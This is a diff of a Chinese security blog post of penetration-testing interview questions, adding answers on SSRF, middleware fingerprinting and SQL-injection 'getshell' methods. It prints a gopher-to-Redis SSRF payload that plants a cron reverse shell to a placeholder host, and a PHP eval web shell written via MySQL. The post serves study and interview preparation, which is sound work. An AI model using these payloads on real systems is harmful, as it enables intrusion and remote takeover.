@@ -10,22 +10,23 @@
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="问到的面试题，记一下，欢迎大佬补充">
+  <meta name="description" content="问到的面试题，记一下，欢迎大佬补充思路">
 <meta property="og:type" content="article">
 <meta property="og:title" content="面试">
 <meta property="og:url" content="https://sn1per-ssd.github.io/2021/03/30/%E9%9D%A2%E8%AF%95/index.html">
 <meta property="og:site_name" content="Sn1pEr&#39;s blog">
-<meta property="og:description" content="问到的面试题，记一下，欢迎大佬补充">
+<meta property="og:description" content="问到的面试题，记一下，欢迎大佬补充思路">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sn1per-ssd.github.io/2021/03/30/%E9%9D%A2%E8%AF%95/img-20210415111601.png">
 <meta property="og:image" content="https://sn1per-ssd.github.io/2021/03/30/%E9%9D%A2%E8%AF%95/img-20210401104534.png">
 <meta property="og:image" content="https://sn1per-ssd.github.io/2021/03/30/%E9%9D%A2%E8%AF%95/img-20210401105338.png">
 <meta property="og:image" content="https://sn1per-ssd.github.io/2021/03/30/%E9%9D%A2%E8%AF%95/img-20210401104534.png">
 <meta property="article:published_time" content="2021-03-30T02:29:18.000Z">
-<meta property="article:modified_time" content="2021-04-01T03:21:35.657Z">
+<meta property="article:modified_time" content="2021-06-07T07:01:40.648Z">
 <meta property="article:author" content="Sn1pEr">
 <meta property="article:tag" content="面试题">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://sn1per-ssd.github.io/2021/03/30/%E9%9D%A2%E8%AF%95/img-20210401104534.png">
+<meta name="twitter:image" content="https://sn1per-ssd.github.io/2021/03/30/%E9%9D%A2%E8%AF%95/img-20210415111601.png">
   
     <link rel="alternative" href="/atom.xml" title="Sn1pEr&#39;s blog" type="application/atom+xml">
   
@@ -245,7 +246,7 @@ var _hmt = _hmt || [];
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">704字</span>
+      <span class="post-count">1.2k字</span>
     </span>
   </span>
 
@@ -254,7 +255,7 @@ var _hmt = _hmt || [];
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">2分</span>
+      <span class="post-count">4分</span>
     </span>
   </span>
 </div>
@@ -265,9 +266,14 @@ var _hmt = _hmt || [];
   
   <div class="article-entry" itemprop="articleBody">
     
-    <p>问到的面试题，记一下，欢迎大佬补充</p>
+    <p>问到的面试题，记一下，欢迎大佬补充思路</p>
 <a id="more"></a>
 
+<h3 id="什么是SSRF，怎么判断有SSRF，他有什么危害"><a href="#什么是SSRF，怎么判断有SSRF，他有什么危害" class="headerlink" title="什么是SSRF，怎么判断有SSRF，他有什么危害"></a>什么是SSRF，怎么判断有SSRF，他有什么危害</h3><p>SSRF是服务端请求伪造，是一种由攻击者构造形成由服务端发起请求的一个安全漏洞，简单地说，就是利用一个可发起网络请求的服务当作跳板来攻击其他服务。</p>
+<p><img src="./img-20210415111601.png"></p>
+<p>一般用来读取本机文件(file协议)，端口存活（<code>?url=127.0.0.1:1</code>，爆破端口），dict协议读取端口版本信息（<code>?url=dict://127.0.0.1:22</code>），gopher通过redis反弹shell（假设网站路径为/var/www/html，且redis可未授权访问 <code>?url=gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</code>）</p>
+<p>如何判断：利用dnslog生成url，然后用http协议访问即可。</p>
+<p>危害：file协议读取本地文件，探测内网IP，扫描内网端口，攻击内网或本地的应用程序</p>
 <h3 id="如果给定一个无验证码的网站，在提交参数未知的情况下该如何实现爆破，如何知道他爆破成功"><a href="#如果给定一个无验证码的网站，在提交参数未知的情况下该如何实现爆破，如何知道他爆破成功" class="headerlink" title="如果给定一个无验证码的网站，在提交参数未知的情况下该如何实现爆破，如何知道他爆破成功"></a>如果给定一个无验证码的网站，在提交参数未知的情况下该如何实现爆破，如何知道他爆破成功</h3><h4 id="获取参数"><a href="#获取参数" class="headerlink" title="获取参数"></a>获取参数</h4><ol>
 <li>查找form表单里面的input参数，包括hidden的（有前端）</li>
 <li>有时会有js对其进行处理，所以要找到处理的js（前端加密）</li>
@@ -279,7 +285,7 @@ var _hmt = _hmt || [];
 <li>看跳转页面的不同</li>
 <li>登录成功与否的response内容不同</li>
 </ol>
-<h3 id="find的原理是什么，linux上是否有比它更快的查找命令，原理是什么"><a href="#find的原理是什么，linux上是否有比它更快的查找命令，原理是什么" class="headerlink" title="find的原理是什么，linux上是否有比它更快的查找命令，原理是什么"></a>find的原理是什么，linux上是否有比它更快的查找命令，原理是什么</h3><p>原理是每次查询都遍历整个系统的文件。</p>
+<h3 id="find的原理是什么，linux上是否有比它更快的查找命令，原理是什么"><a href="#find的原理是什么，linux上是否有比它更快的查找命令，原理是什么" class="headerlink" title="find的原理是什么，linux上是否有比它更快的查找命令，原理是什么"></a>find的原理是什么，linux上是否有比它更快的查找命令，原理是什么</h3><p>原理是每次查询都遍历相应路径下的文件。</p>
 <p>有，<code>mlocate</code>/<code>locate</code>命令，和everything相同，它在查找时是在一个数据库中进行查找<code>/var/lib/mlocate/mlocate.db</code>，从而快速得到目标位置，所以在查找前最好先运行<code>sudo updatedb</code>来更新数据库</p>
 <h3 id="给定一个网站，如何获取中间件信息，如何知道它开启了哪些服务"><a href="#给定一个网站，如何获取中间件信息，如何知道它开启了哪些服务" class="headerlink" title="给定一个网站，如何获取中间件信息，如何知道它开启了哪些服务"></a>给定一个网站，如何获取中间件信息，如何知道它开启了哪些服务</h3><h4 id="获取中间件信息"><a href="#获取中间件信息" class="headerlink" title="获取中间件信息"></a>获取中间件信息</h4><ol>
 <li>通过bp发包，查看response，一般来说response中会有</li>
@@ -287,6 +293,8 @@ var _hmt = _hmt || [];
 </ol>
 <h4 id="服务探测"><a href="#服务探测" class="headerlink" title="服务探测"></a>服务探测</h4><ol>
 <li>根据功能点来看相关的服务</li>
+<li>根据网页图标(icon)判断OA等</li>
+<li>有时又powered by xxxcms或在前端页面中存在xxxcms的字样。</li>
 <li>端口探测，部分服务会开启一些其他端口</li>
 </ol>
 <h3 id="nmap探测端口存活的原理"><a href="#nmap探测端口存活的原理" class="headerlink" title="nmap探测端口存活的原理"></a>nmap探测端口存活的原理</h3><p>192.168.80.128为ubuntu，且开放了tcp80端口</p>
@@ -300,6 +308,13 @@ var _hmt = _hmt || [];
 <p><img src="./img-20210401104534.png"></p>
 <p>也就是说，不同的参数，是让nmap发送不同的报文给对应端口。</p>
 <p>能建立连接或有回应则开放或关闭（官方对于关闭端口的解释是：它接受Nmap的探测报文并作出响应）。而由于包过滤阻止探测报文到达端口， Nmap无法确定该端口是否开放则为过滤的。</p>
+<h3 id="sql-getshell方法"><a href="#sql-getshell方法" class="headerlink" title="sql getshell方法"></a>sql getshell方法</h3><p>如果是mysql，首先要看secure_file_priv环境变量，而且要知道读写的绝对路径。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv &#x3D; 空的时候 ，任意读写</span><br><span class="line">secure_file_priv &#x3D; 某个路径的时候，只能在规定的那个路径下读写</span><br><span class="line">secure_file_priv &#x3D; NULL 不能读写</span><br></pre></td></tr></table></figure>
+<ol>
+<li><code>select &#39;&lt;?php @eval($_POST[a]);?&gt;&#39; into &#39;xxxxxx/a.php&#39;</code></li>
+<li>开启general log并修改他的存储位置，然后执行<code>select &#39;&lt;?php @eval($_POST[a]);?&gt;&#39;</code>。</li>
+<li>sqlmap –os-shell，GPC为off，php主动转义的功能关闭，必须是root权限（原理和1基本相同，写一个可上传文件的php文件，然后再通过这个文件上传一个执行系统命令的文件即可达到getshell）</li>
+</ol>
 <h1 id="血和泪的教训"><a href="#血和泪的教训" class="headerlink" title="血和泪的教训"></a>血和泪的教训</h1><ol>
 <li>别写太多东西，会就写，不会就别写，别整熟悉精通那一套话术</li>
 <li>尽量写和申请工作相关的知识，如渗透测试就多写关于渗透测试的知识和经历</li>
@@ -423,6 +438,15 @@ var _hmt = _hmt || [];
 
 <nav id="article-nav">
   
+    <a href="/2021/04/07/vulnstack(%E4%B8%80)%E9%9D%B6%E6%9C%BA/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          vulnstack(一)靶机
+        
+      </div>
+    </a>
+  
   
     <a href="/2021/03/29/phpcms%E5%AE%A1%E8%AE%A1/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title">phpcms审计</div>
@@ -452,7 +476,7 @@ var _hmt = _hmt || [];
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E7%BB%99%E5%AE%9A%E4%B8%80%E4%B8%AA%E6%97%A0%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E7%BD%91%E7%AB%99%EF%BC%8C%E5%9C%A8%E6%8F%90%E4%BA%A4%E5%8F%82%E6%95%B0%E6%9C%AA%E7%9F%A5%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E8%AF%A5%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%88%86%E7%A0%B4%EF%BC%8C%E5%A6%82%E4%BD%95%E7%9F%A5%E9%81%93%E4%BB%96%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F"><span class="toc-number">1.</span> <span class="toc-text">如果给定一个无验证码的网站，在提交参数未知的情况下该如何实现爆破，如何知道他爆破成功</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%8F%82%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">获取参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F"><span class="toc-number">1.2.</span> <span class="toc-text">爆破成功</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#find%E7%9A%84%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8Clinux%E4%B8%8A%E6%98%AF%E5%90%A6%E6%9C%89%E6%AF%94%E5%AE%83%E6%9B%B4%E5%BF%AB%E7%9A%84%E6%9F%A5%E6%89%BE%E5%91%BD%E4%BB%A4%EF%BC%8C%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">2.</span> <span class="toc-text">find的原理是什么，linux上是否有比它更快的查找命令，原理是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%99%E5%AE%9A%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%EF%BC%8C%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E4%B8%AD%E9%97%B4%E4%BB%B6%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%A6%82%E4%BD%95%E7%9F%A5%E9%81%93%E5%AE%83%E5%BC%80%E5%90%AF%E4%BA%86%E5%93%AA%E4%BA%9B%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.</span> <span class="toc-text">给定一个网站，如何获取中间件信息，如何知道它开启了哪些服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E4%B8%AD%E9%97%B4%E4%BB%B6%E4%BF%A1%E6%81%AF"><span class="toc-number">3.1.</span> <span class="toc-text">获取中间件信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="toc-number">3.2.</span> <span class="toc-text">服务探测</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3%E5%AD%98%E6%B4%BB%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">4.</span> <span class="toc-text">nmap探测端口存活的原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A1%80%E5%92%8C%E6%B3%AA%E7%9A%84%E6%95%99%E8%AE%AD"><span class="toc-number"></span> <span class="toc-text">血和泪的教训</span></a>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSSRF%EF%BC%8C%E6%80%8E%E4%B9%88%E5%88%A4%E6%96%AD%E6%9C%89SSRF%EF%BC%8C%E4%BB%96%E6%9C%89%E4%BB%80%E4%B9%88%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.</span> <span class="toc-text">什么是SSRF，怎么判断有SSRF，他有什么危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E7%BB%99%E5%AE%9A%E4%B8%80%E4%B8%AA%E6%97%A0%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E7%BD%91%E7%AB%99%EF%BC%8C%E5%9C%A8%E6%8F%90%E4%BA%A4%E5%8F%82%E6%95%B0%E6%9C%AA%E7%9F%A5%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E8%AF%A5%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%88%86%E7%A0%B4%EF%BC%8C%E5%A6%82%E4%BD%95%E7%9F%A5%E9%81%93%E4%BB%96%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F"><span class="toc-number">2.</span> <span class="toc-text">如果给定一个无验证码的网站，在提交参数未知的情况下该如何实现爆破，如何知道他爆破成功</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%8F%82%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">获取参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F"><span class="toc-number">2.2.</span> <span class="toc-text">爆破成功</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#find%E7%9A%84%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8Clinux%E4%B8%8A%E6%98%AF%E5%90%A6%E6%9C%89%E6%AF%94%E5%AE%83%E6%9B%B4%E5%BF%AB%E7%9A%84%E6%9F%A5%E6%89%BE%E5%91%BD%E4%BB%A4%EF%BC%8C%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">3.</span> <span class="toc-text">find的原理是什么，linux上是否有比它更快的查找命令，原理是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%99%E5%AE%9A%E4%B8%80%E4%B8%AA%E7%BD%91%E7%AB%99%EF%BC%8C%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E4%B8%AD%E9%97%B4%E4%BB%B6%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%A6%82%E4%BD%95%E7%9F%A5%E9%81%93%E5%AE%83%E5%BC%80%E5%90%AF%E4%BA%86%E5%93%AA%E4%BA%9B%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.</span> <span class="toc-text">给定一个网站，如何获取中间件信息，如何知道它开启了哪些服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E4%B8%AD%E9%97%B4%E4%BB%B6%E4%BF%A1%E6%81%AF"><span class="toc-number">4.1.</span> <span class="toc-text">获取中间件信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="toc-number">4.2.</span> <span class="toc-text">服务探测</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3%E5%AD%98%E6%B4%BB%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">5.</span> <span class="toc-text">nmap探测端口存活的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql-getshell%E6%96%B9%E6%B3%95"><span class="toc-number">6.</span> <span class="toc-text">sql getshell方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A1%80%E5%92%8C%E6%B3%AA%E7%9A%84%E6%95%99%E8%AE%AD"><span class="toc-number"></span> <span class="toc-text">血和泪的教训</span></a>
                     </div>
                 </span>
             </div>
@@ -657,6 +681,18 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">nmap</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">phpcms</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">phpmyadmin</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
               </li>
              
@@ -665,15 +701,35 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">靶机</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">内网</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">代理</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">tips</a>
+                <a href="javascript:void(0)" class="js-tag color5">源码泄露</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">源码泄露</a>
+                <a href="javascript:void(0)" class="js-tag color4">端口号</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">面试题</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -694,22 +750,6 @@ gitalk.render('gitalk-container')
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">phpstudy</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">端口号</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">phpcms</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">代理</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">面试题</a>
               </li>
             
             <div class="clearfix"></div>
